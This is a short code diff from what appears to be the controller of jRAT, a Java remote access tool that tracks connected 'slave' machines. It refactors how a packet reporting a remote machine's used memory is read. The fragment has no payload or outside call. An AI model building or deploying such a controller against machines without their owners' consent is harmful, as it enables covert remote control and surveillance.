@@ -5,14 +5,12 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelMemoryUsage;
 
-import java.io.DataInputStream;
-
 
 public class Packet24UsedMemory extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
-		long used = dis.readLong();
+	public void read(Slave slave) throws Exception {
+		long used = slave.readLong();
 		
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
 		
